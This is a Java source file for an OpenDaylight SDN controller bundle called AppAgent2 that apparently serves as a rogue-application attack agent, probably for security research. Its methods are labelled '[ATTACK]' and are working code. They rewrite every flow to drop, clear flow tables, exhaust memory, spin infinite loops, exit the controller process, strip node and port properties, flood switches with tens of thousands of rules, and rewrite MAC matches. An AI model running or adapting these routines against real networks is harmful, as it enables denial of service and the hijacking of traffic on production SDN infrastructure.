package com.example.appagent2;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.math.BigInteger;
import java.net.InetAddress;
import java.net.UnknownHostException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Random;
import java.util.Set;
import java.util.Vector;

import org.opendaylight.controller.hosttracker.IfIptoHost;
import org.opendaylight.controller.hosttracker.hostAware.HostNodeConnector;
import org.opendaylight.controller.sal.action.Action;
import org.opendaylight.controller.sal.action.Drop;
import org.opendaylight.controller.sal.core.Node;
import org.opendaylight.controller.sal.core.NodeConnector;
import org.opendaylight.controller.sal.flowprogrammer.Flow;
import org.opendaylight.controller.sal.flowprogrammer.IFlowProgrammerService;
import org.opendaylight.controller.sal.match.Match;
import org.opendaylight.controller.sal.match.MatchField;
import org.opendaylight.controller.sal.match.MatchType;
import org.opendaylight.controller.sal.packet.IDataPacketService;
import org.opendaylight.controller.sal.packet.IListenDataPacket;
import org.opendaylight.controller.sal.packet.Packet;
import org.opendaylight.controller.sal.packet.PacketResult;
import org.opendaylight.controller.sal.packet.RawPacket;
import org.opendaylight.controller.sal.reader.FlowOnNode;
import org.opendaylight.controller.sal.utils.EtherTypes;
import org.opendaylight.controller.sal.utils.IListener;
import org.opendaylight.controller.sal.utils.ServiceHelper;
import org.opendaylight.controller.sal.utils.Status;
import org.opendaylight.controller.statisticsmanager.IStatisticsManager;
import org.opendaylight.controller.switchmanager.ISwitchManager;
import org.opendaylight.controller.topologymanager.ITopologyManager;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;


/*
 * Simple bundle to grab some statistics Fred Hsu
 */
@SuppressWarnings("deprecation")
public class AppAgent2 implements IListenDataPacket {
	private static final Logger log = LoggerFactory.getLogger(AppAgent2.class);

	private ISwitchManager switchManager = null;
	private IFlowProgrammerService programmer = null;
	private IDataPacketService dataPacketService = null;
	private Map<Long, NodeConnector> mac_to_port = new HashMap<Long, NodeConnector>();
	private long ary[][];
	private ArrayList<long[][]> arry;

	String containerName = "default";
	private int thread_count = 0;
	int count = 0;
	IStatisticsManager statsManager = (IStatisticsManager) ServiceHelper
			.getInstance(IStatisticsManager.class, containerName, this);

	ITopologyManager topoManager = (ITopologyManager) ServiceHelper
			.getInstance(ITopologyManager.class, containerName, this);

	IfIptoHost hosttracker = (IfIptoHost) ServiceHelper.getInstance(
			IfIptoHost.class, containerName, this);

	Vector<Flow> flows = new Vector<Flow>();

	private Communication cm;

	public AppAgent2() {
	}

	void init() {
	}

	void destroy() {
	}

	void stop() {
	}

	void setDataPacketService(IDataPacketService s) {
		this.dataPacketService = s;
	}

	void unsetDataPacketService(IDataPacketService s) {
		if (this.dataPacketService == s) {
			this.dataPacketService = null;
		}
	}

	public void setFlowProgrammerService(IFlowProgrammerService s) {
		this.programmer = s;
	}

	public void unsetFlowProgrammerService(IFlowProgrammerService s) {
		if (this.programmer == s) {
			this.programmer = null;
		}
	}

	void setSwitchManager(ISwitchManager s) {
		this.switchManager = s;
	}

	void unsetSwitchManager(ISwitchManager s) {
		if (this.switchManager == s) {
			this.switchManager = null;
		}
	}

	void start() {
//		connectManager();
	}

	public void connectManager() {
		cm = new Communication();
		cm.setServerAddr("127.0.0.1", 3366);
		cm.setAgent(this);
		cm.connectServer("AppAgent2");
		cm.start();
	}

	public void printFlowsAtNode(Node node) {
		for (FlowOnNode flow : statsManager.getFlows(node)) {
			System.out.println(flow.getFlow() + "\n Bytes: "
					+ flow.getByteCount());
		}
	}

	public boolean Flow_Rule_Modification() {
		System.out.println("[ATTACK] Flow_Rule_Modification");
		try {
			for (Node node : switchManager.getNodes()) {
				for (FlowOnNode flow : statsManager.getFlows(node)) {
					List<Action> actions = new ArrayList<Action>();
					actions.add(new Drop());
					Flow newflow = new Flow(flow.getFlow().getMatch(), actions);
					Status status = programmer.modifyFlow(node, flow.getFlow(),
							newflow);
					if (!status.isSuccess())
						return false;
				}
			}
		} catch (Exception e) {
			System.out.println(e);
			return false;
		}

		return true;
	}

	public boolean Flow_Table_Cleareance() {
		System.out.println("[ATTACK] Flow_Table_Cleareance");
		try {
			for (Node node : switchManager.getNodes()) {
				for (FlowOnNode flow : statsManager.getFlows(node)) {
					Status status = programmer.removeFlow(node, flow.getFlow());

					/* This function doen't work properly */
					// Status status = programmer.removeAllFlows(node);

					if (!status.isSuccess())
						return false;
				}
			}
		} catch (Exception e) {
			System.out.println(e);
		}

		return true;
	}

	public void Resource_Exhaustion_Mem() {
		System.out.println("[ATTACK] Resource Exhausion : Mem");
		// ary = new long[Integer.MAX_VALUE][Integer.MAX_VALUE];
		arry = new ArrayList<long[][]>();
		while (true) {
			System.out.println("Memory");
			arry.add(new long[Integer.MAX_VALUE][Integer.MAX_VALUE]);
		}
	}

	public void System_Command_Execution() {
		System.out
				.println("[ATTACK] System Command Execution : EXIT Controller");
		System.exit(0);
	}

	public void addFlow() {
		/*
		 * System.out.println(">>This is Ethernet!!");
		 * 
		 * 
		 * //Packet pk = this.dataPacketService.decodeDataPacket( //
		 * formattedPak.getPayload() // ); Packet pk =
		 * formattedPak.getPayload(); System.out.println(">> payload : " + pk);
		 * 
		 * //Ethernet eth = (Ethernet)formattedPak;
		 * 
		 * short ethtype = ((Ethernet)formattedPak).getEtherType(); String a =
		 * String.format("%X", ethtype); System.out.println(">> Ethtype : " + a
		 * );
		 * 
		 * Match match = new Match(); match.setField( new
		 * MatchField(MatchType.IN_PORT, incoming_connector) );
		 * 
		 * List<Action> actions = new ArrayList<Action>(); Controller controll =
		 * new Controller(); actions.add(controll);
		 * 
		 * Flow f = new Flow(match, actions); f.setHardTimeout((short)10000);
		 * Status status = programmer.addFlow(incoming_node, f);
		 */
	}

	public void Infinite_Loop() {
		int i = 0;
		System.out.println("[ATTACK] Infinite Loop");

		while (true) {
			i++;

			if (i == 10)
				i = 0;
		}

	}

	public void Internal_Storage_Abuse() {
		System.out.println("[ATTACK] topology_remove");
		Set<Node> node_array;
		node_array = switchManager.getNodes();
		for (Node node : node_array) {
			switchManager.removeNodeAllProps(node);
		}
		for (Node node : node_array) {
			System.out.println("[ATTACK] [Node ID=" + node.getNodeIDString()
					+ "]");
		}
	}

	public void Flow_Rule_Flooding() {
		System.out.println("[ATTACK] Flow_Rule_Flooding");

		short priority = 1;
		byte[] bytes = BigInteger.valueOf(4444).toByteArray();
		InetAddress addr = null;
		Match match = new Match();
		try {
			addr = InetAddress.getByName("127.0.0.1");
		} catch (UnknownHostException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		List<Action> actions = new ArrayList<Action>();
		actions.add(new Drop());

		// Create matches
		match.setField(MatchType.DL_TYPE, EtherTypes.IPv4.shortValue());
		match.setField(MatchType.NW_DST, addr);

		Flow flow = new Flow(match, actions);
		flow.setIdleTimeout((short) 0);
		flow.setHardTimeout((short) 0);
		flow.setPriority(priority);

		for (Node node : switchManager.getNodes()) {
			Set<NodeConnector> set = switchManager.getNodeConnectors(node);
			for (NodeConnector nodecon : set) {
				match.setField(MatchType.IN_PORT, nodecon);

				while (priority <= 32765) {
					flow.setPriority(priority);
					programmer.addFlow(node, flow);
					priority++;
				}
			}
		}
	}

	public void nodeconnector_attack() {
		System.out.println("[ATTACK] nodeconnector_attack");
		for (Node node : switchManager.getNodes()) {
			Set<NodeConnector> set = switchManager.getNodeConnectors(node);
			for (NodeConnector nodecon : set) {
				System.out.println(nodecon.getNodeConnectorIdAsString() + ":"
						+ nodecon.getNodeConnectorIDString());
				switchManager.removeNodeConnectorAllProps(nodecon);
			}
		}

		for (Node node : switchManager.getNodes()) {
			System.out.println("After attack");
			System.out.println(node.getNodeIDString() + ":" + node.getType());
		}
	}

	public void Switch_Firmware_Abuse() {
		System.out.println("[ATTACK] Switch_Firmware_Abuse");

		Set<HostNodeConnector> hosts = hosttracker.getAllHosts();

		Match modifiedMatch = new Match();
		modifiedMatch.setField(MatchType.DL_TYPE, EtherTypes.IPv4.shortValue());

		try {
			for (Node node : switchManager.getNodes()) {
				for (FlowOnNode flow : statsManager.getFlows(node)) {
					Flow oldflow = flow.getFlow();
					MatchField oldfield = oldflow.getMatch().getField(
							MatchType.NW_DST);
					InetAddress ipaddr = (InetAddress) oldfield.getValue();
					byte[] newMacAddr = null;

					for (HostNodeConnector hc : hosts) {
						String addr = ipaddr.toString().substring(1);
						System.out.println(addr + ":"
								+ hc.getNetworkAddressAsString());
						if (addr.equals(hc.getNetworkAddressAsString())) {
							newMacAddr = hc.getDataLayerAddressBytes();
							modifiedMatch
									.setField(MatchType.DL_DST, newMacAddr);
							Flow newflow = new Flow(modifiedMatch,
									oldflow.getActions());

							Status status = programmer.modifyFlow(node,
									oldflow, newflow);

							if (status.isSuccess())
								System.out.println("Rule Modify Success");
						}
					}

				}
			}
		} catch (Exception e) {
			System.out.println(e);
		}
	}

	void looping() {
		while (true)
			;
	}

	@Override
	public PacketResult receiveDataPacket(RawPacket inPkt) {
		return PacketResult.KEEP_PROCESSING;
	}

	public IListener.Command command() {
		return IListener.Command.STOP;
	}
}
